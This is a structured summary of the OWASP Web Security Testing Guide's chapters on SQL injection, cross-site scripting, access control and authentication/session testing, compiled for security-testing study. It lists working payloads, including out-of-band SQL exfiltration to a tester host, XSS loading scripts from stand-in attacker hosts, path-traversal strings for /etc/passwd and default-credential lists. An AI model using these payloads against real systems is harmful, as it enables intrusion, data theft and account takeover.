### 1. SQL Injection
**OWASP Category:** A05:2025 - Injection *(task-supplied; book cites "Top 10 2017-A1-Injection")*
**WSTG Test ID(s):** WSTG-INPV-05 (with sub-guides WSTG-INPV-05.x: Oracle, MySQL, SQL Server, PostgreSQL, MS Access, NoSQL, ORM, Client-side)
**Source:** WSTG v4.2, Ch. 4.7 Input Validation Testing, §4.7.5 "Testing for SQL Injection", printed pp. 234–256.

#### 1. Test Objectives
- "Identify SQL injection points." (p. 235)
- "Assess the severity of the injection and the level of access that can be achieved through it." (p. 235)
- Confirming conditions: the application builds SQL from user input "without proper input validation" so a "user-controlled SQL query" executes; a single quote `'`, semicolon `;`, comment delimiter, or type-mismatch input produces a DB error, altered result set, authentication bypass, or measurable time delay.

#### 2. Testing Approach & Methodology
**A. Detection**
- Understand when the app talks to a DB. Typical cases: authentication forms, search engines, e-commerce catalogues (p. 235).
- **Do:** List *all* input fields that could reach a query — including hidden POST fields, HTTP headers, and Cookies — and test each **separately** ("only one variable must vary while all the other remain constant"). (pp. 235–236)
- **Do:** Inject a single quote `'` or semicolon `;` (string terminator / statement terminator). **Look for:** DB error message in the response — and also in HTML/JavaScript source, since errors may be hidden from the rendered page. **Tools:** web proxy to view hidden fields. (pp. 235–236)
- **Do:** Insert a string where a number is expected; use comment delimiters (`--`, `/* */`) and keywords `AND`/`OR`. **Look for:** type-conversion or syntax errors; if only a generic "500 Server Error" / custom page appears, switch to blind techniques. (pp. 236)

**B. Standard / Classic testing**
- Authentication bypass: supply `' OR '1'='1` style input to both username and password to force an always-true `WHERE` clause (p. 237).
- Handle parentheses by adding closing `)` until the query is valid; neutralize trailing conditions with a comment (`/*` for most DBMS, `--` for Oracle) (p. 237).
- Constrain a multi-row result to one with `LIMIT 1` where the app expects exactly one record (p. 238).
- **SELECT / logic test:** compare `id=10 AND 1=2` (no/blank result) vs `id=10 AND 1=1` (valid result) (p. 238).
- **Stacked queries:** if API+DBMS allows (e.g. PHP+PostgreSQL, ASP+SQL Server), append `; INSERT INTO ...` (p. 238).

**C. Fingerprinting the database**
- Read the application's error message (distinct strings per DBMS — see §5) (p. 239).
- If no error, use string-concatenation syntax that differs per DBMS to confirm the engine (p. 239).

**D. Exploitation techniques**
- **Union:** find column count with `ORDER BY <n>--`; find column types by substituting `NULL`/`1`; join a forged `SELECT` with `UNION [ALL] SELECT ...`; use `LIMIT` or an impossible id (`99999`) to surface the injected row (pp. 239–241).
- **Boolean (blind):** extract data character-by-character with `SUBSTRING`, `ASCII`, `LENGTH`; craft an always-false baseline (`AND '1'='2'`) to distinguish TRUE vs FALSE responses; terminate via `LENGTH(...)=N` (pp. 241–243).
- **Error-based:** force a DB error that embeds extracted data (DBMS-specific, e.g. Oracle `UTL_INADDR.GET_HOST_NAME`) (p. 243).
- **Out-of-band:** exfiltrate over a second channel (e.g. Oracle `UTL_HTTP.request` to a tester-controlled web server / Netcat listener) (p. 244).
- **Time delay (blind):** conditional `sleep`/delay; infer TRUE when the server response is delayed (p. 244).
- **Stored-procedure injection:** unsanitized dynamic SQL inside a procedure (p. 244).

**E. Signature / WAF evasion (pp. 245–246):** whitespace variation, null bytes `%00`, inline comments `/**/`, URL encoding, `CHAR()`/hex encoding, string concatenation (`EXEC('SEL'+'ECT 1')`), variable declaration, alternative always-true expressions.

**F. Automation / Gray-box:** blind extraction needs high query volume → "may need an automatic tool"; for custom PL/SQL apps, confirm with a single quote then the concatenation operator (pp. 243, 253–254).

#### 3. Test Vectors & Payloads
- Error trigger: `'` ; `;` ; a string where an int is expected.
- Auth bypass: `1' or '1' = '1` (user and pass); `1' or '1' = '1'))/*` ; `1' or '1' = '1')) LIMIT 1/*`.
- Logic: `http://www.example.com/product.php?id=10 AND 1=2` / `...AND 1=1`.
- Stacked: `http://www.example.com/product.php?id=10; INSERT INTO users (…)`.
- Column discovery: `...product.php?id=10 ORDER BY 10--`.
- Column typing: `...id=10 UNION SELECT 1,null,null--` ; `...id=10 UNION SELECT 1,1,null--`.
- Union exfil: `$id=1 UNION ALL SELECT creditCardNumber,1,1 FROM CreditCardTable`; `...id=99999 UNION SELECT 1,1,null--`.
- Fingerprint/version: `SELECT id, name FROM users WHERE id=1 UNION SELECT 1, version() limit 1,1` (MySQL); `... @@version ...` (MS SQL).
- Blind boolean: `1' AND ASCII(SUBSTRING(username,1,1))=97 AND '1'='1` ; baseline false `1' AND '1' = '2` ; length `1' AND LENGTH(username)=N AND '1' = '1`.
- Error-based (Oracle 10g): `10||UTL_INADDR.GET_HOST_NAME( (SELECT user FROM DUAL) )--`.
- Out-of-band (Oracle): `10||UTL_HTTP.request('testerserver.com:80'||(SELECT user FROM DUAL))--`.
- Time delay (MySQL 5.x): `10 AND IF(version() like '5%', sleep(10), 'false'))--`.
- MySQL quote-less strings: `password LIKE 0x4125` ; `password LIKE CHAR(65,37)`.
- MySQL fingerprint comment: `1 /*! and 1=0 */` ; version `/*!40110 and 1=0*/`.
- Evasion: `%00' UNION SELECT password FROM Users WHERE username='admin'--` ; `'/**/UNION/**/SELECT/**/...` ; `name=char(114,111,111,116)` ; `name=unhex('726F6F74')` ; `EXEC('SEL' + 'ECT 1')`.
- PL/SQL confirm: `author=DICK'ENS` (error) then `author=DICK'||'ENS` (same result ⇒ confirmed).

#### 4. Tools Mentioned
- **SQLMap** (Bernardo Damele) — automatic SQL injection / automated auditing (pp. 244, 246).
- **SQL Injection Fuzz Strings (wfuzz) – Fuzzdb** — payload fuzz lists (p. 246).
- **sqlbftools** — SQLi brute-force tooling (p. 246).
- **MySqloit** (Muhaimin Dzulfakar) — MySQL injection takeover (p. 246).
- **Netcat (`nc`)** — listener for out-of-band exfiltration (p. 244).
- **Apache / web server** — receive OOB HTTP callbacks (p. 244).
- **Orascan**, **NGS SQuirreL** — Oracle web-app / RDBMS vulnerability scanners (p. 254).

#### 5. Indicators of Vulnerability
- DBMS error strings. **MS SQL:** `Microsoft OLE DB Provider for ODBC Drivers error '80040e14' ... Unclosed quotation mark ...`; `... Syntax error converting the varchar value 'test' to a column of data type int.` **MySQL:** `You have an error in your SQL syntax; ... near '\'' at line 1`. **Oracle:** `ORA-00933: SQL command not properly ended`. **PostgreSQL:** `Query failed: ERROR: syntax error at or near "'" ...`. (pp. 236, 239)
- Union errors revealing structure: `Unknown column '10' in 'order clause'`; `All cells in a column must have the same datatype` (p. 241).
- Authentication succeeds with crafted credentials (always-true condition) (p. 237).
- Boolean technique: response differs measurably between TRUE and FALSE inferential queries (pp. 241–242).
- Time delay: server response time increases by the injected sleep interval (p. 244).
- OOB: the tester's listener/web server receives a callback containing query output (p. 244).

#### 6. False Positives & Limitations
- Vulnerability scanners that flag by returned web-server version produce "both false positives and false negatives" (version obscured ⇒ false negative; vendor back-ports patches without bumping version ⇒ false positive) — general config-testing caveat applicable to automated DB checks (p. 89).
- Boolean inference fails when "the server returns two different pages as a result of two identical consecutive web requests"; a template/filter is then required to strip volatile content before comparison (p. 240).
- MySQL library connectors do **not** support `;`-separated multiple queries, so stacked injection like MS SQL is not possible there (an injection attempt such as `1 ; update ...` errors) (p. 255).
- Pre-4.0 MySQL lacks `UNION`/subqueries → only Boolean or time-based blind is viable (p. 254).
- Testing can be destructive: time-delay with very high sleep, stacked `INSERT/UPDATE`, or PUT-uploaded shells can damage production; blind extraction needs a high query volume (pp. 243–244).

#### 7. Key Quotes from the Book
> "SQL injection testing checks if it is possible to inject data into the application so that it executes a user-controlled SQL query in the database." — §4.7.5 Summary, p. 234
> "The very first test usually consists of adding a single quote ' or a semicolon ; to the field or parameter under test." — §4.7.5 Detection Techniques, p. 235
> "it is very important to test each field separately: only one variable must vary while all the other remain constant, in order to precisely understand which parameters are vulnerable and which are not." — §4.7.5, p. 236
> "The UNION operator is used in SQL injections to join a query, purposely forged by the tester, to the original query." — §4.7.5 Union Exploitation Technique, p. 239
> "The time delay exploitation technique is very useful when the tester find a Blind SQL Injection situation, in which nothing is known on the outcome of an operation." — §4.7.5 Time Delay Exploitation Technique, p. 243
> "The blind SQL injection attack needs a high volume of queries. The tester may need an automatic tool to exploit the vulnerability." — §4.7.5 Boolean Exploitation Technique, p. 243

---

### 2. Cross-Site Scripting (XSS)
**OWASP Category:** A05:2025 - Injection *(task-supplied; book cites "Top 10" via XSS Filter Evasion / OWASP resources)*
**WSTG Test ID(s):** WSTG-INPV-01 (Reflected), WSTG-INPV-02 (Stored), WSTG-CLNT-01 (DOM-based)
**Source:** WSTG v4.2 — §4.7.1 "Testing for Reflected Cross Site Scripting" (pp. 217–223); §4.7.2 "Testing for Stored Cross Site Scripting" (pp. 224–229); §4.11.1 "Testing for DOM-Based Cross Site Scripting" (pp. 378–381).

#### 1. Test Objectives
- **Reflected (INPV-01):** "Identify variables that are reflected in responses." / "Assess the input they accept and the encoding that gets applied on return (if any)." (p. 217)
- **Stored (INPV-02):** "Identify stored input that is reflected on the client-side." / "Assess the input they accept and the encoding that gets applied on return (if any)." (p. 224)
- **DOM (CLNT-01):** "Identify DOM sinks." / "Build payloads that pertain to every sink type." (p. 378)
- Confirmation: injected script executes in the victim's browser (e.g., an `alert()`/`prompt()` dialog), or special characters (`< > & ' "`) return un-encoded in a context that permits execution.

#### 2. Testing Approach & Methodology
**Reflected (black-box, ≥3 phases):**
1. **Detect input vectors** — enumerate every user-defined variable and input method, "including hidden or non-obvious inputs such as HTTP parameters, POST data, hidden form field values, and predefined radio or selection values." Use in-browser HTML editors or web proxies to see hidden variables. (p. 217)
2. **Analyze input vectors** — submit crafted (harmless) probe strings per vector, via a fuzzer, a known-attack-string list, or manually. (p. 217)
3. **Check impact** — inspect the returned HTML; locate the probe; identify which special characters were "not properly encoded, replaced, or filtered out." The vulnerable character set "depends on the context of that section of HTML." Key HTML entities to verify are encoded: `>`, `<`, `&`, `'`, `"`; within HTML-action / JavaScript context also `\n`, `\r`, `'`, `"`, `\`, `\uXXXX`. (pp. 217–218)
4. **Bypass XSS filters** — assume browser protections are off; test attribute-value injection, alternate syntax/encoding, non-recursive-filter evasion, external-script inclusion, HTTP Parameter Pollution. (pp. 219–221)
- **Gray/White-box:** with partial/full knowledge, analyze input handling and whether sanitization routines can be circumvented; review all user-sourced variables. (pp. 221)

**Stored (black-box):** mirrors reflected, plus:
1. **Identify input forms** that persist data: user/profile pages, shopping cart, file manager, settings/preferences, forum/message board, blog comments, logs. (p. 225)
2. **Analyze HTML code** — determine if and how the stored input is positioned in page context (HTML tag vs. JS); investigate out-of-band input channels; **test all areas reachable by administrators** (stored payload may fire in an admin's browser). (p. 225)
3. **Test for stored XSS** — submit payloads, ensuring they actually reach the back-end (disable client-side JS controls or edit the request via proxy); test both GET and POST. (p. 226)
4. **Leverage with BeEF** — inject a JavaScript hook (`<script src=.../hook.js>`), wait for a user to view the page, then control the browser from the BeEF console. (p. 226)
5. **File upload** — check whether HTML/TXT uploads or arbitrary MIME types (e.g. an image served as `text/html`) allow stored payloads (MIME-mishandling). (pp. 226–227)
- **Gray-box:** enter special/invalid chars via the front end, analyze responses, identify validation controls, inspect the back-end store, and (white-box) review source variables/functions (table of PHP `$_GET/$_POST/$_REQUEST/$_FILES`, ASP `Request.QueryString/Form`, JSP `doGet/doPost/request.getParameter`). (pp. 227–228)

**DOM-based (CLNT-01):** Because the flow is controlled client-side, server-side filtering/detection is often "impotent."
- Crawl the site to find every JavaScript execution instance and where user input is accepted; prefer **top-down** testing for very large libraries. (p. 379)
- Distinguish two input forms: data written by the server into JS vs. input taken from client-side JS objects (`window.location`, `window.referrer`). Exploitability depends on server filtering vs. browser encoding respectively. (p. 379)
- Note JS executed **outside** `<script>` blocks (event handlers, CSS `expression`), and off-site CSS/script objects. (p. 379)
- **Automated testing has "only very limited success"** (it looks for payload reflection in the server response); **manual testing** of source is required — examine where code is dynamically written to the page, where the DOM is modified, or where scripts execute directly. (pp. 379–380)

#### 3. Test Vectors & Payloads
- Basic probes: `<script>alert(123)</script>` ; `"><script>alert(document.cookie)</script>` (p. 217).
- Link/behavior demo: `http://example.com/index.php?user=<script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");AllLinks[0].href = "http://badexample.com/malicious.exe";}</script>` (p. 219).
- Attribute-value escape (no `<`/`>`): `" onfocus="alert(document.cookie)` into `value="INPUT_FROM_USER"` (p. 220).
- Encoding/case variation: `"><script >alert(document.cookie)</script >` ; `"><ScRiPt>alert(document.cookie)</ScRiPt>` ; `"%3cscript%3ealert(document.cookie)%3c/script%3e` (p. 220).
- Non-recursive filter bypass: `<scr<script>ipt>alert(document.cookie)</script>` (p. 220).
- External-script filter bypass: `http://example/?var=<SCRIPT%20a=">"%20SRC="http://attacker/xss.js"></SCRIPT>` (p. 221).
- HTTP Parameter Pollution: `http://example/page.php?param=<script&param=>[...]</&param=script>` (p. 221).
- Stored (encoded, to break out of an `<input value=...>`): `aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;` ; `aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E` (p. 226).
- Stored BeEF hook: `aaa@aa.com"><script src=http://attackersite/hook.js></script>` (p. 226).
- File-upload payload (GIF declared `Content-Type: text/html`): `<script>alert(document.cookie)</script>` (p. 227).
- DOM example sink/source: `document.write("Site is at: " + document.location.href + ".");` exploited by appending `#<script>alert('xss')</script>` to the URL (p. 378); `document.write(document.URL.substring(pos,document.URL.length));` where `pos` follows `message=` (p. 379).
- Reference payload set: **XSS Filter Evasion Cheat Sheet** and **Mario XSS Cheat** page (pp. 218, 221, 226).

#### 4. Tools Mentioned
- **PHP Charset Encoder (PCE)** — encode payloads across 65 charsets (pp. 221, 228).
- **Hackvertor** — online JS encoding/obfuscation (pp. 221, 228).
- **XSS-Proxy** — advanced XSS attack tool (pp. 222, 228).
- **ratproxy** — semi-automated passive web-app audit (p. 222).
- **Burp Proxy / Burp Suite** — intercepting HTTP(S) proxy (pp. 222, 228).
- **OWASP ZAP** — intercepting proxy with built-in scanner (pp. 222, 229).
- **BeEF** — browser exploitation framework (stored XSS impact) (pp. 224, 228).
- **XSS Assistant** — Greasemonkey script to test for XSS (p. 228).
- Web application fuzzer / automated attack-string list (p. 217).

#### 5. Indicators of Vulnerability
- A payload such as `<script>alert(123)</script>` produces a pop-up/dialog ("This indicates that there is an XSS vulnerability..."). (p. 219)
- Special characters (`< > & ' "`) appear **un-encoded** in the returned HTML in an executable context. (p. 218)
- Stored case: after re-loading the page the injected `<script>` appears verbatim in the HTML and executes (p. 226).
- Filtering hint: the string "SCRIPT" being replaced by a space or NULL "could be a potential sign of XSS filtering in action." (p. 226)
- DOM case: the dialog fires in the browser **without the payload ever reaching the server** (fragment after `#`). (p. 378)

#### 6. False Positives & Limitations
- "analyzing answers can get complex" — a pop-up dialog is used precisely because it reliably indicates arbitrary-JS execution versus ambiguous reflection. (p. 221)
- Filter outcomes are context-dependent: a deny-list "may not include all possible attack strings," an allow-list "may be overly permissive," so a single negative result does not prove safety — "If at first the test string isn't successful, try another encoding scheme." (pp. 220; cf. 170)
- **DOM-based:** "Automated testing has only very limited success at identifying and validating DOM-based XSS" because it relies on observing the payload in the *server* response; contrived client-only flows "may not be detected," so manual source review is mandatory. (pp. 379–380)
- Browser differences affect results (e.g., Internet Explorer "does not handle MIME types in the same way as Mozilla Firefox," treating TXT-with-HTML as HTML), so a payload may fire in one browser and not another. (p. 227)

#### 7. Key Quotes from the Book
> "Reflected Cross-site Scripting (XSS) occur when an attacker injects browser executable code within a single HTTP response." — §4.7.1 Summary, p. 217
> "One of the primary difficulties in preventing XSS vulnerabilities is proper character encoding. ... the web application might filter out `<script>`, but might not filter `%3cscript%3e`." — §4.7.1 Summary, p. 217
> "Stored Cross-site Scripting (XSS) is the most dangerous type of Cross Site Scripting. ... the malicious data will appear to be part of the web site and run within the user's browser under the privileges of the web application." — §4.7.2 Summary, p. 224
> "Due to their nature, DOM-based XSS vulnerabilities can be executed in many instances without the server being able to determine what is actually being executed. This may make many of the general XSS filtering and detection techniques impotent to such attacks." — §4.11.1 Summary, p. 378
> "Automated testing will not detect areas that may be susceptible to DOM-based XSS unless the testing tool can perform additional analysis of the client-side code." — §4.11.1 How to Test, p. 380

---

### 3. Broken Access Control
**OWASP Category:** A01:2025 *(task-supplied; book cites "Top 10 2013-A4-Insecure Direct Object References" for IDOR and ASVS 4.0.1 for authorization)*
**WSTG Test ID(s):** WSTG-ATHZ-01 (Path/Directory Traversal & File Include), WSTG-ATHZ-02 (Bypassing Authorization Schema), WSTG-ATHZ-03 (Privilege Escalation), WSTG-ATHZ-04 (Insecure Direct Object References)
**Source:** WSTG v4.2, Ch. 4.5 Authorization Testing — ATHZ-01 pp. 168–173; ATHZ-02 pp. 173–178; ATHZ-03 pp. 178–181; ATHZ-04 pp. 181–183.

#### 1. Test Objectives
- **ATHZ-01:** "Identify injection points that pertain to path traversal." / "Assess bypassing techniques and identify the extent of path traversal." (p. 168)
- **ATHZ-02:** "Assess if horizontal or vertical access is possible." (p. 173)
- **ATHZ-03:** "Identify injection points related to privilege manipulation." / "Fuzz or otherwise attempt to bypass security measures." (p. 178)
- **ATHZ-04:** "Identify points where object references may occur." / "Assess the access control measures and if they're vulnerable to IDOR." (p. 181)

#### 2. Testing Approach & Methodology
**ATHZ-01 Path Traversal / File Include** — two stages: (1) **Input Vectors Enumeration** — enumerate every point accepting user content (GET/POST, file uploads, HTML forms, cookies used for page/template generation); flag file-related parameters, unusual extensions, interesting variable names. (2) **Testing Techniques** — inject `../` sequences / absolute paths; if protocols are accepted, probe local filesystem (`file://`) and local/nearby services (`http://localhost:8080`). Use OS-appropriate separators (`/`, `\`, `:`) and multiple encodings. Gray-box: `grep` source for inclusion/filesystem functions (PHP `include/require/fopen/readfile`, JSP `java.io.File/FileReader`, ASP `include file/virtual`); test naive sanitizers (e.g. a single `Replace(.., "..\","")` pass) with doubled sequences. (pp. 168–173)

**ATHZ-02 Bypassing Authorization Schema** — for every post-auth function/resource verify: accessible unauthenticated? after logout? as a different role/privilege? Track all admin functions and retry them as a non-admin.
- **Horizontal:** register two users with identical privileges, hold two active sessions, and for each request swap the session token (and relevant parameters) from user 1 to user 2 — "vulnerable if the responses are the same, contain same private data or indicate successful operation on other users' resource." (pp. 173–174)
- **Vertical:** maintain sessions for two different roles; swap the session identifier from the higher to the lower role — vulnerable if the "weaker privileged session" gets the higher-role data or operation succeeds. Includes admin-page access, access-to-admin-functions (e.g. `addUser`), and access to resources assigned to another role (e.g. CVs in an S3 bucket). (pp. 174–177)
- **Special request-header handling:** test `X-Original-URL` / `X-Rewrite-URL` to override the front-end's URL-based access control; test proxy/forwarding headers (`X-Forwarded-For`, `X-Remote-IP`, etc.) with loopback/RFC1918 values to reach admin panels restricted to local networks. (pp. 177–178)

**ATHZ-03 Privilege Escalation** — record every create/receive/delete function, then try to access it as another user. Test manipulation of: **user group** (`groupID`/`orderID`), **user profile** (hidden `profile=SysAdmin` field), **condition value** (flip an error/validity flag, e.g. `PVValid` from `-1` to `0`), **IP address** (`X-Forwarded-For`), **URL traversal** (reach pages missing an authz check), and **weak session IDs** (guessable `MD5(Password+UserID)`). Distinguish **vertical** vs **horizontal** escalation. (pp. 178–181)

**ATHZ-04 IDOR** — map all locations where user input references objects directly (DB row, file, page, function). Best with ≥2 users owning different objects (plus different privilege levels). Modify the reference parameter and check whether another user's object is retrieved/modified. Four typical scenarios: parameter → DB record, parameter → operation, parameter → filesystem resource (often chained with path traversal), parameter → application functionality (menu item). Reference may be split across multiple parameters. (pp. 181–183)

#### 3. Test Vectors & Payloads
- **Path traversal:** `item=../../../../etc/passwd` ; cookie `USER=1826cc8f:PSTYLE=../../../../etc/passwd` ; `index.php?file=http://www.owasp.org/malicioustxt` ; `file=file:///etc/passwd` ; `file=http://localhost:8080` ; source disclosure `main.cgi?home=main.cgi`.
- **Encoding variants:** `%2e%2e%2f`, `%2e%2e/`, `..%2f`, `%2e%2e%5c`, `..%5c`, `%252e%252e%255c`, `..%255c` (double URL-encode), `..%c0%af`, `..%c1%9c` (overlong UTF-8).
- **Naive-filter bypass:** `file=....//....//boot.ini` ; `file=....\\....\\boot.ini` ; `file= ..\..\boot.ini`.
- **Windows path tricks:** trailing `<`,`>`,`"`,`./`,`.\\`; `file.txt...`; UNC `\\server_or_ip\path\to\file.abc`, `\\?\server_or_ip\...`; device namespace `\\.\GLOBALROOT\Device\HarddiskVolume1\`, `\\.\CdRom0\`.
- **PHP grep regex (gray-box):** `(include|require)(_once)?\s*['"(]?\s*\$_(GET|POST|COOKIE)`.
- **Horizontal bypass:** reuse `username=example_user` under `Cookie: SessionID=ATTACKER_SESSION`.
- **Vertical bypass:** `POST /account/deleteEvent` with `Cookie: SessionID=CUSTOMER_USER_SESSION` and `EventID=1000002`; admin function `POST /admin/addUser ... userID=fakeuser&role=3&group=grp001`.
- **Header overrides:** `X-Original-URL: /donotexist1` ; `X-Rewrite-URL: /donotexist2` ; `X-Forwarded-For: 127.0.0.1` / RFC1918 / `169.254.0.0/16` ; `127.0.0.4:80`.
- **Privilege escalation:** `groupID=grp001&orderID=0001` ; hidden `<input type="hidden" name="profile" value="SysAdmin">` → change to `SysAdmin`; `PVValid` `-1`→`0`; `X-Forwarded-For: 8.1.1.1`; `/../.././userInfo.html`.
- **IDOR:** `somepage?invoice=12345` ; `changepassword?user=someuser` ; `showImage?img=img00011` ; `accessPage?menuitem=12`.

#### 4. Tools Mentioned
- **DotDotPwn** — directory-traversal fuzzer (p. 173).
- **Path Traversal Fuzz Strings (WFuzz)** (p. 173).
- **OWASP ZAP** — incl. ZAP add-on **Access Control Testing** (pp. 173, 178, 181).
- **Burp Suite** — incl. extensions **AuthMatrix** and **Autorize** (pp. 173, 178).
- **Encoding/Decoding tools**, **grep**, **DirBuster** (p. 173).

#### 5. Indicators of Vulnerability
- Traversal returns file contents outside the webroot (e.g. `/etc/passwd`) or source of a server-side script (p. 170).
- Horizontal: "responses are the same, contain same private data or indicate successful operation on other users' resource or data." (p. 174)
- Vertical: a lower-privilege session receives higher-role data or `{"message": "Event was deleted"}` (p. 176).
- Header override: a response marker that the resource was not found (HTTP 404 / "resource not found") when `X-Original-URL`/`X-Rewrite-URL` points at a non-existent path — proves the header is honored (p. 177).
- IDOR: changing the reference parameter returns/acts on an object belonging to a different user (pp. 181–183).

#### 6. False Positives & Limitations
- Traversal needs system knowledge: "There is no point requesting `/etc/passwd` from an IIS web server"; success also depends on filesystem privileges of the web app (p. 170).
- Encoding coverage matters: "It's a common mistake by developers to not expect every form of encoding ... If at first the test string isn't successful, try another encoding scheme." (p. 170)
- Horizontal/vertical tests recommend "two different machines or browsers for the victim and the attacker" to "decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie." (cf. session-fixation guidance, applied to multi-session authz testing)
- GUI-only authorization is a trap: "sometimes, developers perform authorization validation at the GUI level only, and leave the functions without authorization validation" — so hidden UI does not prove protection (p. 176).
- Data-stored traversal payloads are "difficult to discover" because the parameters "seem internal and safe but are not in reality." (p. 172)

#### 7. Key Quotes from the Book
> "By exploiting this kind of vulnerability, an attacker is able to read directories or files which they normally couldn't read, access data outside the web document root, or include scripts and other kinds of files from external websites." — §4.5.1 Summary, p. 168
> "An application will be considered vulnerable if the responses are the same, contain same private data or indicate successful operation on other users' resource or data." — §4.5.2 Horizontal Bypass, p. 174
> "Privilege escalation occurs when a user gets access to more resources or functionality than they are normally allowed, and such elevation or changes should have been prevented by the application." — §4.5.3 Summary, p. 178
> "Insecure Direct Object References (IDOR) occur when an application provides direct access to objects based on user-supplied input. As a result ... attackers can bypass authorization and access resources in the system directly." — §4.5.4 Summary, p. 181
> "Employ the least privilege principles on the users, roles, and resources to ensure that no unauthorized access occurs." — §4.5.2 Remediation, p. 178

---

### 4. Broken Authentication / Session Management
**OWASP Category:** A07:2025 *(task-supplied; book cites OWASP Brute Force, Session Fixation, CSRF Prevention Cheat Sheet, RFC 2965)*
**WSTG Test ID(s):** Authentication — WSTG-ATHN-01 (Credentials over Encrypted Channel), ATHN-02 (Default Credentials), ATHN-03 (Weak Lock Out), ATHN-04 (Bypassing Authentication Schema). Session — WSTG-SESS-01 (Session Management Schema), SESS-02 (Cookie Attributes), SESS-03 (Session Fixation), SESS-05 (CSRF).
**Source:** WSTG v4.2 — Ch. 4.4 Authentication (ATHN-01 pp. 138–143; ATHN-02 pp. 143–146; ATHN-03 pp. 146–149; ATHN-04 pp. 149–155); Ch. 4.6 Session Management (SESS-01 pp. 184–190; SESS-02 pp. 190–194; SESS-03 pp. 194–197; SESS-05 pp. 200–206).

#### 1. Test Objectives
- **ATHN-01:** "Assess whether any use case of the web site or application causes the server or the client to exchange credentials without encryption." (p. 138)
- **ATHN-02:** "Enumerate the applications for default credentials and validate if they still exist." / "Review and assess new user accounts and if they are created with any defaults or identifiable patterns." (p. 143)
- **ATHN-03:** "Evaluate the account lockout mechanism's ability to mitigate brute force password guessing." / "Evaluate the unlock mechanism's resistance to unauthorized account unlocking." (p. 146)
- **ATHN-04:** "Ensure that authentication is applied across all services that require it." (p. 149)
- **SESS-01:** "Gather session tokens... Analyze and ensure that enough randomness exists to stop session forging attacks. Modify cookies that are not signed and contain information that can be manipulated." (p. 185)
- **SESS-02:** "Ensure that the proper security configuration is set for cookies." (p. 190)
- **SESS-03:** "Analyze the authentication mechanism and its flow." / "Force cookies and assess the impact." (p. 194)
- **SESS-05 (CSRF):** "Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user." (p. 203)

#### 2. Testing Approach & Methodology
**ATHN-01 Credentials transport:** Capture traffic for every credential exchange (login, session token issuance, authenticated requests, password-reset codes). Force-browse the HTTP version of login / account-creation / password-reset / change-password and of resources accessed while logged in. **Pass:** all such exchanges stay HTTPS and `Set-Cookie` carries `Secure`. **Fail:** any credential or session token transits HTTP. (pp. 138–142)

**ATHN-02 Default credentials:** Identify the app/appliance (via Information Gathering) and test known vendor default username/password (manufacturer docs, search engines, CIRT lists). Guess common admin names (`admin`, `administrator`, `root`, `system`, `guest`, `operator`, `super`, `qa`, `test`...) and common passwords (blank, `password`, `pass123`, `password123`, `admin`, `guest`); try app/org name as credentials; use contact names/email conventions. Review page source/JS and backup dirs for hard-coded credentials. **New-account defaults:** inspect registration page for format/length; determine if system-generated usernames/passwords are predictable (create many accounts quickly and compare). Beware lockout policy while guessing. Gray-box: ask IT, inspect user DB for empty/default passwords, review config files and code. (pp. 143–146)

**ATHN-03 Weak lock out:** Authenticate failures N times, then a correct login, to find the threshold ("Accounts are typically locked after 3 to 5 unsuccessful attempts"); verify auto-unlock timing (5/10/15 min). Evaluate CAPTCHA weaknesses and the **unlock** mechanism (unlock link must be unique/one-time). (pp. 146–148)

**ATHN-04 Bypassing authentication schema:** Four black-box methods — (1) **Direct page request / forced browsing** to a protected page; (2) **Parameter modification** (flip a fixed success flag, e.g. `authenticated=yes`, in URL/POST/cookie); (3) **Session ID prediction** (linear/partially-changing cookies → brute force the variable field); (4) **SQL injection** on the login form. Gray-box: with source, craft refined attacks (e.g. the PHPBB `unserialize()` boolean-compare bypass). (pp. 149–154)

**SESS-01 Session management schema:** Attack pattern = cookie **collection** → **reverse engineering** → **manipulation** (and overflow). Map every cookie (page that sets it, domain, value, characteristics) and which parts of the app require it. **Session analysis:** examine token structure for information leakage (clear-text, hex/Base64/MD5 encodings, hybrid tokens), randomness/predictability (gather many samples in the same time window, vary one input at a time, look for static vs incrementing/time-based fields), and brute-force feasibility (variance vs validity lifetime). Gray-box criteria: cryptographically random token, ≥50 chars, defined timeout, non-persistent + `Secure` + `HttpOnly`. (pp. 184–189)

**SESS-02 Cookie attributes:** Via intercepting proxy / cookie jar, validate each attribute: `Secure` (HTTPS-only), `HttpOnly` (no script access), `Domain` (not over-broad, not a TLD), `Path` (not over-broad `/`), `Expires` (persistence), `SameSite` (Strict/Lax/None — None requires Secure). Validate prefixes `__Host-` (Secure, no Domain, Path=/) and `__Secure-` (Secure). Most-secure config: `Set-Cookie: __Host-SID=<token>; path=/; Secure; HttpOnly; SameSite=Strict`. (pp. 190–193)

**SESS-03 Session fixation:** Request the site unauthenticated and record the issued session cookie; authenticate using that same cookie; if **no new cookie is issued on successful authentication**, fixation/hijacking is possible. **Forced-cookie test** (network-attacker model, only needed for sites without full HSTS): snapshot the pre-login cookie jar (excluding `__Host-`/`__Secure-`), log in as victim, restore the snapshot, trigger a secure function, and observe whether it succeeds; a two-account variant confirms cross-account impact. Use two machines/browsers to reduce false positives. (pp. 194–196)

**SESS-05 CSRF:** Audit whether session management relies **only** on client-side values (cookies / HTTP Basic auth — not form-based auth). GET resources are trivially exploitable (even via a zero-size `<img>`); POST can be automated with a self-submitting form; JSON endpoints can be hit with `enctype='text/plain'` and a crafted hidden input. Build an HTML page that auto-submits the forged request, host it, and lure the authenticated victim to it. (pp. 200–204)

#### 3. Test Vectors & Payloads
- **ATHN-01:** downgrade `https://www.example.org/login` → `http://...`; force `http://www.example.org/securityRealm/createAccount`; look for POST data exposing `j_username`/`j_password` over HTTP and for missing `Secure` on `Set-Cookie`.
- **ATHN-02:** usernames `admin/administrator/root/system/guest/operator/super/qa/test/test1`; passwords blank/`password`/`pass123`/`password123`/`admin`/`guest`; org-name-as-credential; predictable `user7811` sequence fuzz.
- **ATHN-04:** `http://www.site.com/page.asp?authenticated=no` → `GET /page.asp?authenticated=yes HTTP/1.0`; predictable/partial cookie brute force; PHPBB payload `a:2:{s:11:"autologinid";b:1;s:6:"userid";s:1:"2";}`.
